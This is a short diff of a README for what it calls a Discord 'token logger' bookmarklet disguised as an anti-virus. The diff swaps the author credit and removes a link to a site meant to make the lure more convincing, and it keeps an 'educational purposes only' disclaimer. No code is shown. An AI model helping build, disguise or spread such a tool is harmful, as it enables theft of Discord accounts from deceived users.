@@ -1,6 +1,5 @@
 # Bookmarklet Token Logger for Discord
-A token logger for discord, disguised as an anti-virus, by fluke 
-You can use this site to be a little more convincing: https://discord-antivirus.flukehusky.repl.co/
+A token logger for discord, disguised as an anti-virus, by jango
 
 Note: Please use this at your own risk. This is for educational purposes only. I am not responsible for damages caused to others. 
 
